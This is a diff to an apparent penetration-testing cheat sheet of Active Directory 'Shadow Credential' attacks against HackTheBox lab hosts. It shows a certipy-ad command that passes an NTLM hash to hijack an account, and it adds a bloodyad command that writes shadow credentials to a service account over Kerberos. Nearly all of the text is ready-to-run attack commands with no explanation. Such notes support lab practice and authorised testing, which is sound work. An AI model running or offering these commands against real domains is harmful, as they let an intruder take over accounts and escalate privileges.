@@ -56,3 +56,11 @@ Shadow Credential Attack NTLM Auth
 ```
 certipy-ad shadow auto -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
 ```
+
+---
+
+Shadow Credential Attack Kerberos
+
+```
+bloodyad --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials msa_health$
+```
